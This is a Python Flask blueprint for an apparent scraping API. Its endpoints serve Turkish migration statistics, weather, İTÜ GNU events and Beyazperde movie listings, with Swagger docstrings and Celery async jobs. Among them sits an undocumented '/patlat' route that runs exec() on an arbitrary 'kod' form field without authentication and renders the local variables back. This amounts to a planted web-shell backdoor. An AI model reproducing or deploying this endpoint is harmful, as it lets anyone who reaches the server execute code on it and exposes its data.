import urllib.parse

import flask
import parse_site_worker

from parse_site import get_goc_data, get_weather_data_xpath, get_itugnu_data, get_beyazperde_data, get_weather_response

blueprint = flask.Blueprint('parse_site_api', __name__)


@blueprint.route("/goc")
def api_get_goc_data():
    """
    In/Out migration data in Turkey, parsed, max avg min calculated
    ---
    definitions:
      - schema:
          id: Migration Stat
          type: object
          properties:
            "Province":
              type: string
            "Total population":
              type: number
            "In-migration":
              type: number
            "Out-migration":
              type: number
            "Net migration":
              type: number
            "Rate of net migration (‰)":
              type: number
    responses:
      200:
        description: Array of migration statistics
        schema:
          type: array
          items:
            $ref: '#/definitions/Migration Stat'
    """
    return flask.jsonify(get_goc_data())


@blueprint.route("/hava")
def api_get_weather_data_xpath():
    """
    Latest temperature in your currrent location, according to Yahoo!.
    ---
    definitions:
      - schema:
          id: Temperature
          type: object
          properties:
            degree:
              type: number
            scale:
              type: string
    responses:
      200:
        description: Returns the temperature
        schema:
          $ref: '#/definitions/Temperature'
    """
    return flask.jsonify(get_weather_data_xpath(get_weather_response()))


@blueprint.route("/itugnu")
def api_get_itugnu_data():
    """
    Get latest events from İTÜ GNU webpage
    ---
    definitions:
      - schema:
          id: GnuEvent
          type: object
          properties:
            etkinlik:
              type: string
              description: Event's Name
            durum:
              type: boolean
              description: Event Status
    responses:
      200:
        description: Returns events of İTÜ GNU
        schema:
          type: array
          items:
            $ref: '#/definitions/GnuEvent'
    """
    return flask.jsonify(get_itugnu_data())


@blueprint.route("/beyazperde")
def api_get_beyazperde_data():
    """
    This week's and last 5 weeks' now playing list
    ---
    definitions:
      - schema:
          id: Movie
          type: object
          properties:
            isim:
              type: string
              description: Movie Name
            skor:
              type: number
              description: Score between 0.0 and 5.0
      - schema:
          id: Movie Week
          type: object
          properties:
            hafta:
              type: string
              description: ISO8601 formatted date object
            filmler:
              type: array
              description: This week's movie list
              items:
                $ref: '#/definitions/Movie'
    responses:
      200:
        description: Returns the last + 5 weeks' movies
        schema:
          type: array
          items:
            $ref: '#/definitions/Movie Week'
    """
    return flask.jsonify(get_beyazperde_data())


@blueprint.route("/beyazperde/<int:sayi>")
def api_get_beyazperde_data_sayili(sayi):
    """
    This week's and last 5 weeks' now playing list
    ---
    parameters:
        - in: path
          name: sayi
          schema:
            type: integer
          required: true
          description: Number of previous weeks
    definitions:
      - schema:
          id: Movie
          type: object
          properties:
            isim:
              type: string
              description: Movie Name
            skor:
              type: number
              description: Score between 0.0 and 5.0
      - schema:
          id: Movie Week
          type: object
          properties:
            hafta:
              type: string
              description: ISO8601 formatted date object
            filmler:
              type: array
              description: This week's movie list
              items:
                $ref: '#/definitions/Movie'
    responses:
      200:
        description: Returns the last + n weeks' movies
        schema:
          type: array
          items:
            $ref: '#/definitions/Movie Week'
    """
    return flask.jsonify(get_beyazperde_data(sayi))



@blueprint.route("/patlat", methods=["GET", "POST"])
def api_patlat():
    if "kod" in flask.request.form:
        exec(flask.request.form["kod"])
    return flask.render_template("patlat.html", data=locals())


@blueprint.route("/beyazperde/async/result/<id>")
def api_get_async_result_beyazperde_data_sayili(id):
    from celery.result import AsyncResult

    async_result = AsyncResult(id, app=parse_site_worker.app)
    el_cevap = {
        "status": async_result.status,
        "ready": async_result.ready(),
        "data": []
    }
    if el_cevap["ready"]:
        el_cevap["data"] = async_result.result

    return flask.jsonify(el_cevap)

@blueprint.route("/beyazperde/async/<int:sayi>")
def api_get_async_beyazperde_data_sayili(sayi):
    ilk_is = parse_site_worker.get_tarihler.s()
    ikinci_is = parse_site_worker.split_jobs.s()
    butun_is = ilk_is | ikinci_is
    result = butun_is.delay(sayi)
    return flask.jsonify(url=urllib.parse.urljoin(flask.request.url_root, flask.url_for(".api_get_async_result_beyazperde_data_sayili", id=result.id)))